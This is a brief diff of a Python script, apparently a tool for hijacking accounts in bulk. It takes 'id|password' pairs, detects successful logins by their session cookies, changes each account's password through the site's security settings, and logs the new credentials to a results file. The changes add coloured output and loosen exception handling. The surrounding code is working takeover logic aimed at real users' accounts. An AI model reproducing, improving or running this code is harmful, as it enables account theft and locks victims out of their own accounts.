@@ -46,8 +46,8 @@ class Ubahpw:
 			if 'save-device' in str(sub) or 'm_sess' in str(sub):
 				self.ganti(ids)
 			else:
-				print(f'[Failed] {ids}')
-		except a: pass
+				print(f'[\033[91mFailed\033[0m] {ids}')
+		except: pass
 
 	def ganti(self,ids):
 		br.open(self.u.format('/settings/security/password/'))
@@ -63,6 +63,6 @@ class Ubahpw:
 			except: pass
 			pc=open('result/newpass.txt','a')
 			pc.write(f"{ids.split('|')[0]}|{self.pbaru}\n")
-			print(f"[success] {ids} >> {ids.split('|')[0]}|{self.pbaru}")
+			print(f"[\033[92msuccess\033[0m] {ids} \033[93m>>\033[0m {ids.split('|')[0]}|{self.pbaru}")
 
 Ubahpw()
